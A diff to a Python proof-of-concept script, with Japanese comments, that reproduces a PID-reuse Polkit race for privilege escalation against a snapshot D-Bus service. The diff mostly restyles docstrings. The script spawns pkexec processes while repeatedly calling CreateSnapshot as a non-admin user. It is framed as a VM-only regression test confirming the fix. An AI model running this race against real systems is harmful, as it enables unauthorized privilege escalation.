@@ -1,27 +1,20 @@
 #!/usr/bin/env python3
 """
-poc_polkit_race.py - Issue #1 (CVE-2013-4288 class) 再現PoC
+@file poc_polkit_race.py
+@brief Issue #1 (CVE-2013-4288クラス) の権限昇格raceを再現するPoC
 
-目的:
-    v1.3.2 の checkAuthorization() は PolkitQt1::UnixProcessSubject を使っており、
-    PID-based で Polkit 判定を行う。bob (non-admin) から呼び出した直後に、
-    同じPIDを持つプロセスを exec で置き換えたり、PID再利用を誘発することで
-    Polkit判定が別プロセス情報に対して行われ、権限昇格が可能になる。
+目的 :
+    v1.3.2のcheckAuthorization()はPolkitQt1::UnixProcessSubjectを使い、PIDベースでPolkit判定を行う
+    bob (非管理者) から呼び出した直後に同じPIDのプロセスをexecで置き換えるかPID再利用を誘発すると
+    Polkit判定が別プロセスの情報に対して行われ、権限昇格が可能になる
+    修正版 (P0-1後) ではSystemBusNameSubjectを用いるためD-Bus接続単位で判定され、このraceは成立しない
 
-    修正版 (P0-1 後) では SystemBusNameSubject を用いるため
-    D-Bus接続単位で判定され、このraceは成立しない。
+使い方 : sudo -u bob python3 poc_polkit_race.py --iterations 1000
+終了コード : 0 = 期待どおり (baselineは再現、修正版は阻止)、1 = regression、2 = VM外またはpython3-dbus未導入
 
-使い方:
-    sudo -u bob python3 poc_polkit_race.py --iterations 1000
-
-Exit:
-    BASELINEモードで reproduced == True → 0 (再現成功 PASS)
-    修正版モードで reproduced == False → 0 (阻止 PASS)
-    それ以外 → 1 (regression)
-
-注意:
-    このPoCはVM内でのみ実行すること。common.sh の assert_running_in_vm 相当を
-    Pythonでも確認している。
+注意 :
+    このPoCはVM内でのみ実行すること
+    common.shのassert_running_in_vm相当をPythonでも確認している
 """
 
 import argparse
@@ -44,6 +37,12 @@ DBUS_IFACE = "com.presire.qsnapper.Operations"
 
 
 def assert_vm() -> None:
+    """
+    @brief VM内で実行されていることを確認する
+
+    Raises:
+        SystemExit: VM外 (systemd-detect-virtがnone) の場合 (終了コード2)
+    """
     virt = subprocess.run(
         ["systemd-detect-virt"], capture_output=True, text=True
     ).stdout.strip()
@@ -53,7 +52,12 @@ def assert_vm() -> None:
 
 
 def attempt_call() -> str:
-    """CreateSnapshot を1回試行。戻り値: 'success' | 'denied' | 'other:<msg>'"""
+    """
+    @brief CreateSnapshotを1回試行し、結果を分類する
+
+    Returns:
+        success (成功)、denied (拒否)、other:<msg> (その他のエラー) のいずれか
+    """
     bus = SystemBus()
     proxy = bus.get_object(DBUS_SERVICE, DBUS_PATH)
     ops = Interface(proxy, DBUS_IFACE)
@@ -68,18 +72,33 @@ def attempt_call() -> str:
 
 
 def race_worker(_: int) -> str:
-    # 並列に短寿命 pkexec プロセスを走らせてPID再利用を誘発
-    # (TODO: 実環境に合わせて pkexec target を調整)
+    """
+    @brief PID再利用を誘発する短寿命プロセスと並行してCreateSnapshotを試行する
+
+    Args:
+        _ : 未使用のイテレーション番号 (ThreadPoolExecutor.map用)
+
+    Returns:
+        attempt_call()と同じ分類文字列
+    """
+    # 並列に短寿命のpkexecプロセスを走らせてPID再利用を誘発する
+    # TODO: 実環境に合わせてpkexecの対象を調整する
     subprocess.Popen(
         ["pkexec", "--disable-internal-agent", "true"],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
     )
-    time.sleep(0.0005)  # race window
+    time.sleep(0.0005)  # 競合窓を設ける
     return attempt_call()
 
 
 def main() -> int:
+    """
+    @brief race PoCを実行し、モードに応じて再現または阻止を判定する
+
+    Returns:
+        0 = 期待どおり (baselineは再現、修正版は阻止)、1 = regression
+    """
     parser = argparse.ArgumentParser()
     parser.add_argument("--iterations", type=int, default=1000)
     parser.add_argument("--workers", type=int, default=8)
